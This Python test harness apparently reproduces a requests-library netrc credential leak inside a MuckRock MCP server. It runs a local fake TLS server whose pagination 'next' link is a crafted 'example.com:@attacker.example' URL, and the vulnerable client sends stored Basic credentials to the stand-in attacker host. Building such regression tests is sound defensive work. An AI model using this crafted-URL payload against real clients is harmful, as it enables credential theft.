from __future__ import annotations

import argparse
import base64
import json
import os
import ssl
import subprocess
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Any

from shared_host_runner import evidence_rows, run_shared_host_case


CASE_ID = "GH-P4-191"
SECRET = "GH_P4_191_NETRC_AUTH_READBACK_6d2e8b"
NETRC_LOGIN = "GH_P4_191_LOGIN"
NETRC_PASSWORD = SECRET
NETRC_AUTH = "Basic " + base64.b64encode(f"{NETRC_LOGIN}:{NETRC_PASSWORD}".encode()).decode()
VERSIONS = {"vulnerable": "2.32.3", "fixed": "2.32.4"}
REPOSITORY = "https://github.com/morisy/muckrock-mcp"
SOURCE_COMMIT = "56e6b078c4ec19fc2c6f3ca67d77e3ad4bfea49b"
TOOL = "search_foia_requests"
TOOL_ARGUMENTS = {"query": "public records", "limit": 10}
AGENT_TASK = "Call the frozen search_foia_requests Tool and report only its returned result."


class Boundary:
    def __init__(self) -> None:
        self.requests: list[dict[str, Any]] = []
        self.lock = threading.Lock()
        cert_dir = Path("/tmp/gh-p4-191-certs")
        cert_dir.mkdir(parents=True, exist_ok=True)
        self.cert = cert_dir / "boundary.crt"
        self.key = cert_dir / "boundary.key"
        subprocess.run(
            [
                "openssl", "req", "-x509", "-newkey", "rsa:2048", "-nodes",
                "-days", "2", "-subj", "/CN=www.muckrock.com",
                "-addext", "subjectAltName=DNS:www.muckrock.com,DNS:accounts.muckrock.com,DNS:attacker.example,DNS:example.com",
                "-keyout", str(self.key), "-out", str(self.cert),
            ], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE,
        )
        boundary = self

        class Handler(BaseHTTPRequestHandler):
            def _record(self) -> dict[str, Any]:
                item = {
                    "method": self.command,
                    "host": self.headers.get("Host", ""),
                    "path": self.path,
                    "headers": dict(self.headers),
                }
                length = int(self.headers.get("Content-Length", "0"))
                item["body"] = self.rfile.read(length).decode("utf-8", errors="replace") if length else ""
                with boundary.lock:
                    boundary.requests.append(item)
                return item

            def _json(self, payload: dict[str, Any], status: int = 200) -> None:
                body = json.dumps(payload, ensure_ascii=False).encode("utf-8")
                self.send_response(status)
                self.send_header("Content-Type", "application/json")
                self.send_header("Content-Length", str(len(body)))
                self.send_header("Connection", "close")
                self.end_headers()
                self.wfile.write(body)

            def do_GET(self) -> None:  # noqa: N802
                item = self._record()
                host = item["host"].split(":", 1)[0].lower()
                if host == "www.muckrock.com":
                    self._json({
                        "count": 1,
                        "next": "https://example.com:@attacker.example/foia-page",
                        "previous": None,
                        "results": [{"id": 1910, "title": "ordinary first page", "status": "public", "agency": 1}],
                    })
                    return
                if host == "attacker.example":
                    auth = item["headers"].get("Authorization", "")
                    self._json({
                        "count": 1,
                        "next": None,
                        "previous": None,
                        "results": [{"id": 1911, "title": f"AUTH={auth}", "status": "public", "agency": 1}],
                    })
                    return
                self._json({"detail": "unexpected boundary host"}, status=404)

            def do_POST(self) -> None:  # noqa: N802
                item = self._record()
                host = item["host"].split(":", 1)[0].lower()
                if host == "accounts.muckrock.com" and item["path"].startswith("/api/token/"):
                    self._json({"access": "GT_ACCESS_TOKEN", "refresh": "GT_REFRESH_TOKEN"})
                    return
                self._json({"detail": "unexpected boundary host"}, status=404)

            def log_message(self, *_args: object) -> None:
                return

        raw_server = ThreadingHTTPServer(("0.0.0.0", 443), Handler)
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(str(self.cert), str(self.key))
        raw_server.socket = context.wrap_socket(raw_server.socket, server_side=True)
        self.server = raw_server
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)

    def start(self) -> None:
        self.thread.start()

    def close(self) -> None:
        self.server.shutdown()
        self.server.server_close()
        self.thread.join(timeout=3)

    def snapshot(self) -> dict[str, Any]:
        with self.lock:
            requests = list(self.requests)
        attacker = [item for item in requests if item["host"].split(":", 1)[0].lower() == "attacker.example"]
        return {
            "boundary": "container-local-muckrock-api-pagination-and-netrc-readback",
            "requests": requests,
            "initial_api_requests": [item for item in requests if item["host"].split(":", 1)[0].lower() == "www.muckrock.com"],
            "attacker_requests": attacker,
            "attacker_authorizations": [item["headers"].get("Authorization", "") for item in attacker],
        }


def write_json(path: Path, value: Any) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(value, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--output", type=Path, required=True)
    parser.add_argument("--side", choices=("vulnerable", "fixed"), required=True)
    parser.add_argument("--repetition", type=int, required=True)
    args = parser.parse_args()
    boundary = Boundary()
    boundary.start()
    try:
        home = Path("/tmp/gt-home")
        home.mkdir(parents=True, exist_ok=True)
        netrc = home / ".netrc"
        netrc.write_text(f"machine example.com login {NETRC_LOGIN} password {NETRC_PASSWORD}\n", encoding="utf-8")
        netrc.chmod(0o600)
        env = {
            "PYTHONPATH": f"/opt/deps/{args.side}:/opt/deps/common:/workspace/source:/opt/gt",
            "MUCKROCK_USERNAME": "gt-user",
            "MUCKROCK_PASSWORD": "gt-password",
            "NETRC": str(netrc),
            "HOME": str(home),
            "REQUESTS_CA_BUNDLE": str(boundary.cert),
            "SSL_CERT_FILE": str(boundary.cert),
            "HTTP_PROXY": "",
            "HTTPS_PROXY": "",
            "ALL_PROXY": "",
            "NO_PROXY": "*",
            "http_proxy": "",
            "https_proxy": "",
            "all_proxy": "",
            "no_proxy": "*",
            "PYTHONIOENCODING": "utf-8",
        }
        record = run_shared_host_case(
            run_id=f"{CASE_ID}-{args.side}-{args.repetition}",
            case_id=CASE_ID,
            revision=args.side,
            repetition=args.repetition,
            command=["python3", "/workspace/source/muckrock_server.py"],
            cwd=Path("/workspace/source"),
            env=env,
            server_name=REPOSITORY,
            tool_name=TOOL,
            tool_arguments=TOOL_ARGUMENTS,
            task=AGENT_TASK,
            system_prompt="You are a deterministic research host. Use the frozen tool call and report only its returned Tool result.",
            server_revision=f"{SOURCE_COMMIT}; python-muckrock==2.3.0; requests=={VERSIONS[args.side]}",
            timeout=45,
        )
        snapshot = boundary.snapshot()
        record["external_boundary"] = snapshot
        args.output.mkdir(parents=True, exist_ok=True)
        write_json(args.output / "host_record.json", record)
        (args.output / "evidence.jsonl").write_text(
            "".join(json.dumps(row, ensure_ascii=False) + "\n" for row in evidence_rows(record)),
            encoding="utf-8",
        )
        write_json(args.output / "boundary_snapshot.json", snapshot)
        write_json(args.output / "runtime_resolution.json", {
            "selected_dependency": "requests",
            "selected_version": VERSIONS[args.side],
            "pythonpath": env["PYTHONPATH"],
            "requests_version": record.get("runtime_dependency", {}).get("version", VERSIONS[args.side]),
        })
        valid = not record["quality"]["invalid_run"] and all(value == "observed" for value in record["evidence_levels"].values())
        print(json.dumps({"status": "OK" if valid else "INVALID", "output": str(args.output)}, ensure_ascii=False))
        return 0 if valid else 1
    finally:
        boundary.close()


if __name__ == "__main__":
    raise SystemExit(main())
